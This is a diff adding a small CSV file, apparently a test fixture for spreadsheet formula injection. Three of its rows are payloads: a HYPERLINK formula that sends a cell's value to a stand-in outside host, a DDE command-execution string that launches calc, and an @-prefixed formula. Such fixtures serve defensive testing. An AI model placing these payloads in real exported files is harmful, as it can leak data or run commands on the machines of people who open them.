@@ -1,0 +1,4 @@
+name,amount
+Ada,"=HYPERLINK(""http://elsewhere.example/?""&A1,""Click"")"
+Grace,=cmd|' /C calc'!A0
+Katherine,@SUM(1+1)
